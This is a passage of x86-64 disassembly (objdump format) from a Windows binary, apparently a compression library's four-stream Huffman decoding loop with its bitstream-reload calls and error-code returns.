   140003267:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000326b:	8b f8                	mov    %eax,%edi
   14000326d:	e8 0e e0 ff ff       	call   0x140001280
   140003272:	44 8b 4c 24 3c       	mov    0x3c(%rsp),%r9d
   140003277:	33 d2                	xor    %edx,%edx
   140003279:	85 c0                	test   %eax,%eax
   14000327b:	0f 94 c2             	sete   %dl
   14000327e:	33 c0                	xor    %eax,%eax
   140003280:	85 ff                	test   %edi,%edi
   140003282:	0f 94 c0             	sete   %al
   140003285:	33 c9                	xor    %ecx,%ecx
   140003287:	23 d0                	and    %eax,%edx
   140003289:	85 f6                	test   %esi,%esi
   14000328b:	0f 44 ca             	cmove  %edx,%ecx
   14000328e:	33 c0                	xor    %eax,%eax
   140003290:	45 85 f6             	test   %r14d,%r14d
   140003293:	0f 44 44 24 38       	cmove  0x38(%rsp),%eax
   140003298:	23 c8                	and    %eax,%ecx
   14000329a:	33 c0                	xor    %eax,%eax
   14000329c:	4c 3b 64 24 48       	cmp    0x48(%rsp),%r12
   1400032a1:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   1400032a5:	0f 42 c1             	cmovb  %ecx,%eax
   1400032a8:	85 c0                	test   %eax,%eax
   1400032aa:	0f 85 20 fd ff ff    	jne    0x140002fd0
   1400032b0:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400032b5:	be 3f 00 00 00       	mov    $0x3f,%esi
   1400032ba:	44 8b 75 68          	mov    0x68(%rbp),%r14d
   1400032be:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400032c2:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   1400032c7:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400032cc:	eb 05                	jmp    0x1400032d3
   1400032ce:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   1400032d3:	4c 3b e9             	cmp    %rcx,%r13
   1400032d6:	77 0a                	ja     0x1400032e2
   1400032d8:	48 3b fa             	cmp    %rdx,%rdi
   1400032db:	77 05                	ja     0x1400032e2
   1400032dd:	4c 3b f8             	cmp    %rax,%r15
   1400032e0:	76 0c                	jbe    0x1400032ee
   1400032e2:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400032e9:	e9 c8 05 00 00       	jmp    0x1400038b6
   1400032ee:	48 8d 41 fd          	lea    -0x3(%rcx),%rax
   1400032f2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400032f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400032fc:	e8 bf df ff ff       	call   0x1400012c0
   140003301:	33 c9                	xor    %ecx,%ecx
   140003303:	85 c0                	test   %eax,%eax
   140003305:	0f 94 c1             	sete   %cl
   140003308:	33 c0                	xor    %eax,%eax
   14000330a:	4c 3b 6c 24 20       	cmp    0x20(%rsp),%r13
   14000330f:	0f 92 c0             	setb   %al
   140003312:	85 c8                	test   %ecx,%eax
   140003314:	0f 84 e5 00 00 00    	je     0x1400033ff
   14000331a:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   14000331f:	41 f7 de             	neg    %r14d
   140003322:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
   140003327:	41 ff c7             	inc    %r15d
   14000332a:	41 83 e7 3f          	and    $0x3f,%r15d
   14000332e:	41 83 e6 3f          	and    $0x3f,%r14d
   140003332:	0f 1f 40 00          	nopl   0x0(%rax)
   140003336:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000333d:	00 00 00 
   140003340:	4c 8b 54 24 60       	mov    0x60(%rsp),%r10
   140003345:	44 8b 44 24 68       	mov    0x68(%rsp),%r8d
   14000334a:	49 8b d2             	mov    %r10,%rdx
   14000334d:	41 8b c8             	mov    %r8d,%ecx
   140003350:	48 d3 e2             	shl    %cl,%rdx
   140003353:	41 8b cf             	mov    %r15d,%ecx
   140003356:	48 d3 ea             	shr    %cl,%rdx
   140003359:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000335e:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   140003364:	49 8b d2             	mov    %r10,%rdx
   140003367:	41 88 45 00          	mov    %al,0x0(%r13)
   14000336b:	45 03 c8             	add    %r8d,%r9d
   14000336e:	41 8b c9             	mov    %r9d,%ecx
   140003371:	48 d3 e2             	shl    %cl,%rdx
   140003374:	41 8b ce             	mov    %r14d,%ecx
   140003377:	48 d3 ea             	shr    %cl,%rdx
   14000337a:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000337f:	44 0f b6 44 53 05    	movzbl 0x5(%rbx,%rdx,2),%r8d
   140003385:	49 8b d2             	mov    %r10,%rdx
   140003388:	41 88 45 01          	mov    %al,0x1(%r13)
   14000338c:	45 03 c1             	add    %r9d,%r8d
   14000338f:	41 8b c8             	mov    %r8d,%ecx
   140003392:	48 d3 e2             	shl    %cl,%rdx
   140003395:	41 8b ce             	mov    %r14d,%ecx
   140003398:	48 d3 ea             	shr    %cl,%rdx
   14000339b:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   1400033a1:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400033a6:	45 03 c8             	add    %r8d,%r9d
   1400033a9:	41 88 45 02          	mov    %al,0x2(%r13)
   1400033ad:	41 8b c9             	mov    %r9d,%ecx
   1400033b0:	49 d3 e2             	shl    %cl,%r10
   1400033b3:	41 8b ce             	mov    %r14d,%ecx
   1400033b6:	49 d3 ea             	shr    %cl,%r10
   1400033b9:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400033be:	42 0f b6 44 53 05    	movzbl 0x5(%rbx,%r10,2),%eax
   1400033c4:	41 03 c1             	add    %r9d,%eax
   1400033c7:	89 44 24 68          	mov    %eax,0x68(%rsp)
   1400033cb:	42 0f b6 44 53 04    	movzbl 0x4(%rbx,%r10,2),%eax
   1400033d1:	41 88 45 03          	mov    %al,0x3(%r13)
   1400033d5:	49 83 c5 04          	add    $0x4,%r13
   1400033d9:	e8 e2 de ff ff       	call   0x1400012c0
   1400033de:	33 c9                	xor    %ecx,%ecx
   1400033e0:	85 c0                	test   %eax,%eax
   1400033e2:	0f 94 c1             	sete   %cl
   1400033e5:	33 c0                	xor    %eax,%eax
   1400033e7:	4d 3b ec             	cmp    %r12,%r13
   1400033ea:	0f 92 c0             	setb   %al
   1400033ed:	85 c8                	test   %ecx,%eax
   1400033ef:	0f 85 4b ff ff ff    	jne    0x140003340
   1400033f5:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   1400033fa:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   1400033ff:	4c 8b 55 d8          	mov    -0x28(%rbp),%r10
   140003403:	4d 3b ea             	cmp    %r10,%r13
   140003406:	73 45                	jae    0x14000344d
   140003408:	4c 8b 5c 24 60       	mov    0x60(%rsp),%r11
   14000340d:	44 8b ce             	mov    %esi,%r9d
   140003410:	44 2b 4d 68          	sub    0x68(%rbp),%r9d
   140003414:	44 8b 44 24 68       	mov    0x68(%rsp),%r8d
   140003419:	41 ff c1             	inc    %r9d
   14000341c:	41 83 e1 3f          	and    $0x3f,%r9d
   140003420:	41 8b c8             	mov    %r8d,%ecx
   140003423:	49 8b d3             	mov    %r11,%rdx
   140003426:	48 d3 e2             	shl    %cl,%rdx
   140003429:	41 8b c9             	mov    %r9d,%ecx
   14000342c:	48 d3 ea             	shr    %cl,%rdx
   14000342f:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003434:	44 03 c0             	add    %eax,%r8d
   140003437:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000343c:	41 88 45 00          	mov    %al,0x0(%r13)
   140003440:	49 ff c5             	inc    %r13
   140003443:	4d 3b ea             	cmp    %r10,%r13
   140003446:	72 d8                	jb     0x140003420
   140003448:	44 89 44 24 68       	mov    %r8d,0x68(%rsp)
   14000344d:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140003452:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140003456:	49 83 c6 fd          	add    $0xfffffffffffffffd,%r14
   14000345a:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   14000345f:	e8 5c de ff ff       	call   0x1400012c0
   140003464:	44 8b 6d 68          	mov    0x68(%rbp),%r13d
   140003468:	33 c9                	xor    %ecx,%ecx
   14000346a:	85 c0                	test   %eax,%eax
   14000346c:	0f 94 c1             	sete   %cl
   14000346f:	33 c0                	xor    %eax,%eax
   140003471:	49 3b fe             	cmp    %r14,%rdi
   140003474:	0f 92 c0             	setb   %al
   140003477:	85 c8                	test   %ecx,%eax
   140003479:	0f 84 d7 00 00 00    	je     0x140003556
   14000347f:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   140003484:	44 8b e6             	mov    %esi,%r12d
   140003487:	45 2b e5             	sub    %r13d,%r12d
   14000348a:	45 8b f5             	mov    %r13d,%r14d
   14000348d:	41 ff c4             	inc    %r12d
   140003490:	41 f7 de             	neg    %r14d
   140003493:	41 83 e4 3f          	and    $0x3f,%r12d
   140003497:	41 83 e6 3f          	and    $0x3f,%r14d
   14000349b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034a0:	4c 8b 55 88          	mov    -0x78(%rbp),%r10
   1400034a4:	44 8b 45 90          	mov    -0x70(%rbp),%r8d
   1400034a8:	49 8b d2             	mov    %r10,%rdx
   1400034ab:	41 8b c8             	mov    %r8d,%ecx
   1400034ae:	48 d3 e2             	shl    %cl,%rdx
   1400034b1:	41 8b cc             	mov    %r12d,%ecx
   1400034b4:	48 d3 ea             	shr    %cl,%rdx
   1400034b7:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400034bc:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   1400034c2:	49 8b d2             	mov    %r10,%rdx
   1400034c5:	88 07                	mov    %al,(%rdi)
   1400034c7:	45 03 c8             	add    %r8d,%r9d
   1400034ca:	41 8b c9             	mov    %r9d,%ecx
   1400034cd:	48 d3 e2             	shl    %cl,%rdx
   1400034d0:	41 8b ce             	mov    %r14d,%ecx
   1400034d3:	48 d3 ea             	shr    %cl,%rdx
   1400034d6:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400034db:	44 0f b6 44 53 05    	movzbl 0x5(%rbx,%rdx,2),%r8d
   1400034e1:	49 8b d2             	mov    %r10,%rdx
   1400034e4:	88 47 01             	mov    %al,0x1(%rdi)
   1400034e7:	45 03 c1             	add    %r9d,%r8d
   1400034ea:	41 8b c8             	mov    %r8d,%ecx
   1400034ed:	48 d3 e2             	shl    %cl,%rdx
   1400034f0:	41 8b ce             	mov    %r14d,%ecx
   1400034f3:	48 d3 ea             	shr    %cl,%rdx
   1400034f6:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   1400034fc:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003501:	45 03 c8             	add    %r8d,%r9d
   140003504:	88 47 02             	mov    %al,0x2(%rdi)
   140003507:	41 8b c9             	mov    %r9d,%ecx
   14000350a:	49 d3 e2             	shl    %cl,%r10
   14000350d:	41 8b ce             	mov    %r14d,%ecx
   140003510:	49 d3 ea             	shr    %cl,%r10
   140003513:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140003517:	42 0f b6 44 53 05    	movzbl 0x5(%rbx,%r10,2),%eax
   14000351d:	41 03 c1             	add    %r9d,%eax
   140003520:	89 45 90             	mov    %eax,-0x70(%rbp)
   140003523:	42 0f b6 44 53 04    	movzbl 0x4(%rbx,%r10,2),%eax
   140003529:	88 47 03             	mov    %al,0x3(%rdi)
   14000352c:	48 83 c7 04          	add    $0x4,%rdi
   140003530:	e8 8b dd ff ff       	call   0x1400012c0
   140003535:	33 c9                	xor    %ecx,%ecx
   140003537:	85 c0                	test   %eax,%eax
   140003539:	0f 94 c1             	sete   %cl
   14000353c:	33 c0                	xor    %eax,%eax
   14000353e:	49 3b ff             	cmp    %r15,%rdi
   140003541:	0f 92 c0             	setb   %al
   140003544:	85 c8                	test   %ecx,%eax
   140003546:	0f 85 54 ff ff ff    	jne    0x1400034a0
   14000354c:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140003551:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   140003556:	4c 8b 54 24 50       	mov    0x50(%rsp),%r10
   14000355b:	49 3b fa             	cmp    %r10,%rdi
   14000355e:	73 4a                	jae    0x1400035aa
   140003560:	4c 8b 5d 88          	mov    -0x78(%rbp),%r11
   140003564:	44 8b ce             	mov    %esi,%r9d
   140003567:	44 8b 45 90          	mov    -0x70(%rbp),%r8d
   14000356b:	45 2b cd             	sub    %r13d,%r9d
   14000356e:	41 ff c1             	inc    %r9d
   140003571:	41 83 e1 3f          	and    $0x3f,%r9d
   140003575:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000357c:	00 00 00 00 
   140003580:	41 8b c8             	mov    %r8d,%ecx
   140003583:	49 8b d3             	mov    %r11,%rdx
   140003586:	48 d3 e2             	shl    %cl,%rdx
   140003589:	41 8b c9             	mov    %r9d,%ecx
   14000358c:	48 d3 ea             	shr    %cl,%rdx
   14000358f:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003594:	44 03 c0             	add    %eax,%r8d
   140003597:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000359c:	88 07                	mov    %al,(%rdi)
   14000359e:	48 ff c7             	inc    %rdi
   1400035a1:	49 3b fa             	cmp    %r10,%rdi
   1400035a4:	72 da                	jb     0x140003580
   1400035a6:	44 89 45 90          	mov    %r8d,-0x70(%rbp)
   1400035aa:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400035af:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400035b3:	48 83 c7 fd          	add    $0xfffffffffffffffd,%rdi
   1400035b7:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   1400035bc:	e8 ff dc ff ff       	call   0x1400012c0
   1400035c1:	33 c9                	xor    %ecx,%ecx
   1400035c3:	85 c0                	test   %eax,%eax
   1400035c5:	0f 94 c1             	sete   %cl
   1400035c8:	33 c0                	xor    %eax,%eax
   1400035ca:	4c 3b ff             	cmp    %rdi,%r15
   1400035cd:	0f 92 c0             	setb   %al
   1400035d0:	85 c8                	test   %ecx,%eax
   1400035d2:	0f 84 cc 00 00 00    	je     0x1400036a4
   1400035d8:	4c 8b 64 24 48       	mov    0x48(%rsp),%r12
   1400035dd:	44 8b f6             	mov    %esi,%r14d
   1400035e0:	45 2b f5             	sub    %r13d,%r14d
   1400035e3:	41 8b fd             	mov    %r13d,%edi
   1400035e6:	41 ff c6             	inc    %r14d
   1400035e9:	f7 df                	neg    %edi
   1400035eb:	41 83 e6 3f          	and    $0x3f,%r14d
   1400035ef:	83 e7 3f             	and    $0x3f,%edi
   1400035f2:	4c 8b 55 b0          	mov    -0x50(%rbp),%r10
   1400035f6:	44 8b 45 b8          	mov    -0x48(%rbp),%r8d
   1400035fa:	49 8b d2             	mov    %r10,%rdx
   1400035fd:	41 8b c8             	mov    %r8d,%ecx
   140003600:	48 d3 e2             	shl    %cl,%rdx
   140003603:	41 8b ce             	mov    %r14d,%ecx
   140003606:	48 d3 ea             	shr    %cl,%rdx
   140003609:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000360e:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   140003614:	49 8b d2             	mov    %r10,%rdx
   140003617:	41 88 07             	mov    %al,(%r15)
   14000361a:	45 03 c8             	add    %r8d,%r9d
   14000361d:	41 8b c9             	mov    %r9d,%ecx
   140003620:	48 d3 e2             	shl    %cl,%rdx
   140003623:	8b cf                	mov    %edi,%ecx
   140003625:	48 d3 ea             	shr    %cl,%rdx
   140003628:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000362d:	44 0f b6 44 53 05    	movzbl 0x5(%rbx,%rdx,2),%r8d
   140003633:	49 8b d2             	mov    %r10,%rdx
   140003636:	41 88 47 01          	mov    %al,0x1(%r15)
   14000363a:	45 03 c1             	add    %r9d,%r8d
   14000363d:	41 8b c8             	mov    %r8d,%ecx
   140003640:	48 d3 e2             	shl    %cl,%rdx
   140003643:	8b cf                	mov    %edi,%ecx
   140003645:	48 d3 ea             	shr    %cl,%rdx
   140003648:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   14000364e:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003653:	45 03 c8             	add    %r8d,%r9d
   140003656:	41 88 47 02          	mov    %al,0x2(%r15)
   14000365a:	41 8b c9             	mov    %r9d,%ecx
   14000365d:	49 d3 e2             	shl    %cl,%r10
   140003660:	8b cf                	mov    %edi,%ecx
   140003662:	49 d3 ea             	shr    %cl,%r10
   140003665:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003669:	42 0f b6 44 53 05    	movzbl 0x5(%rbx,%r10,2),%eax
   14000366f:	41 03 c1             	add    %r9d,%eax
   140003672:	89 45 b8             	mov    %eax,-0x48(%rbp)
   140003675:	42 0f b6 44 53 04    	movzbl 0x4(%rbx,%r10,2),%eax
   14000367b:	41 88 47 03          	mov    %al,0x3(%r15)
   14000367f:	49 83 c7 04          	add    $0x4,%r15
   140003683:	e8 38 dc ff ff       	call   0x1400012c0
   140003688:	33 c9                	xor    %ecx,%ecx
   14000368a:	85 c0                	test   %eax,%eax
   14000368c:	0f 94 c1             	sete   %cl
   14000368f:	33 c0                	xor    %eax,%eax
   140003691:	4d 3b fc             	cmp    %r12,%r15
   140003694:	0f 92 c0             	setb   %al
   140003697:	85 c8                	test   %ecx,%eax
   140003699:	0f 85 53 ff ff ff    	jne    0x1400035f2
   14000369f:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   1400036a4:	4c 8b 54 24 58       	mov    0x58(%rsp),%r10
   1400036a9:	4d 3b fa             	cmp    %r10,%r15
   1400036ac:	73 4d                	jae    0x1400036fb
   1400036ae:	4c 8b 5d b0          	mov    -0x50(%rbp),%r11
   1400036b2:	44 8b ce             	mov    %esi,%r9d
   1400036b5:	44 8b 45 b8          	mov    -0x48(%rbp),%r8d
   1400036b9:	45 2b cd             	sub    %r13d,%r9d
   1400036bc:	41 ff c1             	inc    %r9d
   1400036bf:	41 83 e1 3f          	and    $0x3f,%r9d
   1400036c3:	0f 1f 40 00          	nopl   0x0(%rax)
   1400036c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400036ce:	00 00 
   1400036d0:	41 8b c8             	mov    %r8d,%ecx
   1400036d3:	49 8b d3             	mov    %r11,%rdx
   1400036d6:	48 d3 e2             	shl    %cl,%rdx
   1400036d9:	41 8b c9             	mov    %r9d,%ecx
   1400036dc:	48 d3 ea             	shr    %cl,%rdx
   1400036df:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   1400036e4:	44 03 c0             	add    %eax,%r8d
   1400036e7:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400036ec:	41 88 07             	mov    %al,(%r15)
   1400036ef:	49 ff c7             	inc    %r15
   1400036f2:	4d 3b fa             	cmp    %r10,%r15
   1400036f5:	72 d9                	jb     0x1400036d0
   1400036f7:	44 89 45 b8          	mov    %r8d,-0x48(%rbp)
   1400036fb:	4c 8b 7d 08          	mov    0x8(%rbp),%r15
   1400036ff:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003703:	49 8d 7f fd          	lea    -0x3(%r15),%rdi
   140003707:	e8 b4 db ff ff       	call   0x1400012c0
   14000370c:	33 c9                	xor    %ecx,%ecx
   14000370e:	85 c0                	test   %eax,%eax
   140003710:	0f 94 c1             	sete   %cl
   140003713:	33 c0                	xor    %eax,%eax
   140003715:	4c 3b e7             	cmp    %rdi,%r12
   140003718:	0f 92 c0             	setb   %al
   14000371b:	85 c8                	test   %ecx,%eax
   14000371d:	0f 84 d2 00 00 00    	je     0x1400037f5
   140003723:	41 8b fd             	mov    %r13d,%edi
   140003726:	44 8b f6             	mov    %esi,%r14d
   140003729:	45 2b f5             	sub    %r13d,%r14d
   14000372c:	f7 df                	neg    %edi
   14000372e:	41 ff c6             	inc    %r14d
   140003731:	4d 8d 6f fd          	lea    -0x3(%r15),%r13
   140003735:	41 83 e6 3f          	and    $0x3f,%r14d
   140003739:	83 e7 3f             	and    $0x3f,%edi
   14000373c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003740:	4c 8b 55 e0          	mov    -0x20(%rbp),%r10
   140003744:	44 8b 45 e8          	mov    -0x18(%rbp),%r8d
   140003748:	49 8b d2             	mov    %r10,%rdx
   14000374b:	41 8b c8             	mov    %r8d,%ecx
   14000374e:	48 d3 e2             	shl    %cl,%rdx
   140003751:	41 8b ce             	mov    %r14d,%ecx
   140003754:	48 d3 ea             	shr    %cl,%rdx
   140003757:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000375c:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   140003762:	49 8b d2             	mov    %r10,%rdx
   140003765:	41 88 04 24          	mov    %al,(%r12)
   140003769:	45 03 c8             	add    %r8d,%r9d
   14000376c:	41 8b c9             	mov    %r9d,%ecx
   14000376f:	48 d3 e2             	shl    %cl,%rdx
   140003772:	8b cf                	mov    %edi,%ecx
   140003774:	48 d3 ea             	shr    %cl,%rdx
   140003777:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000377c:	44 0f b6 44 53 05    	movzbl 0x5(%rbx,%rdx,2),%r8d
   140003782:	49 8b d2             	mov    %r10,%rdx
   140003785:	41 88 44 24 01       	mov    %al,0x1(%r12)
   14000378a:	45 03 c1             	add    %r9d,%r8d
   14000378d:	41 8b c8             	mov    %r8d,%ecx
   140003790:	48 d3 e2             	shl    %cl,%rdx
   140003793:	8b cf                	mov    %edi,%ecx
   140003795:	48 d3 ea             	shr    %cl,%rdx
   140003798:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   14000379e:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400037a3:	45 03 c8             	add    %r8d,%r9d
   1400037a6:	41 88 44 24 02       	mov    %al,0x2(%r12)
   1400037ab:	41 8b c9             	mov    %r9d,%ecx
   1400037ae:	49 d3 e2             	shl    %cl,%r10
   1400037b1:	8b cf                	mov    %edi,%ecx
   1400037b3:	49 d3 ea             	shr    %cl,%r10
   1400037b6:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400037ba:	42 0f b6 44 53 05    	movzbl 0x5(%rbx,%r10,2),%eax
   1400037c0:	41 03 c1             	add    %r9d,%eax
   1400037c3:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400037c6:	42 0f b6 44 53 04    	movzbl 0x4(%rbx,%r10,2),%eax
   1400037cc:	41 88 44 24 03       	mov    %al,0x3(%r12)
   1400037d1:	49 83 c4 04          	add    $0x4,%r12
   1400037d5:	e8 e6 da ff ff       	call   0x1400012c0
   1400037da:	33 c9                	xor    %ecx,%ecx
   1400037dc:	85 c0                	test   %eax,%eax
   1400037de:	0f 94 c1             	sete   %cl
   1400037e1:	33 c0                	xor    %eax,%eax
   1400037e3:	4d 3b e5             	cmp    %r13,%r12
   1400037e6:	0f 92 c0             	setb   %al
   1400037e9:	85 c8                	test   %ecx,%eax
   1400037eb:	0f 85 4f ff ff ff    	jne    0x140003740
   1400037f1:	44 8b 6d 68          	mov    0x68(%rbp),%r13d
   1400037f5:	44 8b 45 e8          	mov    -0x18(%rbp),%r8d
   1400037f9:	4d 3b e7             	cmp    %r15,%r12
   1400037fc:	73 39                	jae    0x140003837
   1400037fe:	4c 8b 4d e0          	mov    -0x20(%rbp),%r9
   140003802:	41 2b f5             	sub    %r13d,%esi
   140003805:	ff c6                	inc    %esi
   140003807:	83 e6 3f             	and    $0x3f,%esi
   14000380a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003810:	41 8b c8             	mov    %r8d,%ecx
   140003813:	49 8b d1             	mov    %r9,%rdx
   140003816:	48 d3 e2             	shl    %cl,%rdx
   140003819:	8b ce                	mov    %esi,%ecx
   14000381b:	48 d3 ea             	shr    %cl,%rdx
   14000381e:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003823:	44 03 c0             	add    %eax,%r8d
   140003826:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000382b:	41 88 04 24          	mov    %al,(%r12)
   14000382f:	49 ff c4             	inc    %r12
   140003832:	4d 3b e7             	cmp    %r15,%r12
   140003835:	72 d9                	jb     0x140003810
   140003837:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000383c:	48 39 44 24 70       	cmp    %rax,0x70(%rsp)
   140003841:	75 11                	jne    0x140003854
   140003843:	83 7c 24 68 40       	cmpl   $0x40,0x68(%rsp)
   140003848:	75 0a                	jne    0x140003854
   14000384a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000384f:	44 8b d1             	mov    %ecx,%r10d
   140003852:	eb 08                	jmp    0x14000385c
   140003854:	45 33 d2             	xor    %r10d,%r10d
   140003857:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000385c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   140003860:	48 39 45 98          	cmp    %rax,-0x68(%rbp)
   140003864:	75 0b                	jne    0x140003871
   140003866:	83 7d 90 40          	cmpl   $0x40,-0x70(%rbp)
   14000386a:	75 05                	jne    0x140003871
   14000386c:	44 8b c9             	mov    %ecx,%r9d
   14000386f:	eb 03                	jmp    0x140003874
   140003871:	45 33 c9             	xor    %r9d,%r9d
   140003874:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140003878:	48 39 45 c0          	cmp    %rax,-0x40(%rbp)
   14000387c:	75 0a                	jne    0x140003888
   14000387e:	83 7d b8 40          	cmpl   $0x40,-0x48(%rbp)
   140003882:	75 04                	jne    0x140003888
   140003884:	8b d1                	mov    %ecx,%edx
   140003886:	eb 02                	jmp    0x14000388a
   140003888:	33 d2                	xor    %edx,%edx
   14000388a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000388e:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
   140003892:	75 06                	jne    0x14000389a
   140003894:	41 83 f8 40          	cmp    $0x40,%r8d
   140003898:	74 02                	je     0x14000389c
   14000389a:	33 c9                	xor    %ecx,%ecx
   14000389c:	23 ca                	and    %edx,%ecx
   14000389e:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400038a5:	41 23 c9             	and    %r9d,%ecx
   1400038a8:	41 85 ca             	test   %ecx,%r10d
   1400038ab:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   1400038af:	48 0f 44 c8          	cmove  %rax,%rcx
   1400038b3:	48 8b c1             	mov    %rcx,%rax
   1400038b6:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   1400038bd:	00 
   1400038be:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   1400038c5:	00 
   1400038c6:	48 8b b4 24 28 01 00 	mov    0x128(%rsp),%rsi
   1400038cd:	00 
   1400038ce:	4c 8b a4 24 18 01 00 	mov    0x118(%rsp),%r12
   1400038d5:	00 
   1400038d6:	4c 8b b4 24 10 01 00 	mov    0x110(%rsp),%r14
   1400038dd:	00 
   1400038de:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400038e5:	41 5f                	pop    %r15
   1400038e7:	41 5d                	pop    %r13
   1400038e9:	5d                   	pop    %rbp
   1400038ea:	c3                   	ret
   1400038eb:	cc                   	int3
   1400038ec:	cc                   	int3
   1400038ed:	cc                   	int3
   1400038ee:	cc                   	int3
   1400038ef:	cc                   	int3
   1400038f0:	40 53                	rex push %rbx
   1400038f2:	55                   	push   %rbp
   1400038f3:	56                   	push   %rsi
   1400038f4:	57                   	push   %rdi
   1400038f5:	41 56                	push   %r14
   1400038f7:	48 83 ec 30          	sub    $0x30,%rsp
   1400038fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003902:	00 
   140003903:	49 8b f9             	mov    %r9,%rdi
   140003906:	4c 8b 8c 24 88 00 00 	mov    0x88(%rsp),%r9
   14000390d:	00 
   14000390e:	49 8b e8             	mov    %r8,%rbp
   140003911:	4c 8b f2             	mov    %rdx,%r14
   140003914:	4c 8b c3             	mov    %rbx,%r8
   140003917:	48 8b d7             	mov    %rdi,%rdx
   14000391a:	48 8b f1             	mov    %rcx,%rsi
   14000391d:	e8 fe ee ff ff       	call   0x140002820
   140003922:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140003926:	77 3c                	ja     0x140003964
   140003928:	48 3b c3             	cmp    %rbx,%rax
   14000392b:	72 12                	jb     0x14000393f
   14000392d:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   140003934:	48 83 c4 30          	add    $0x30,%rsp
   140003938:	41 5e                	pop    %r14
   14000393a:	5f                   	pop    %rdi
   14000393b:	5e                   	pop    %rsi
   14000393c:	5d                   	pop    %rbp
   14000393d:	5b                   	pop    %rbx
   14000393e:	c3                   	ret
   14000393f:	48 2b d8             	sub    %rax,%rbx
   140003942:	4c 8d 04 38          	lea    (%rax,%rdi,1),%r8
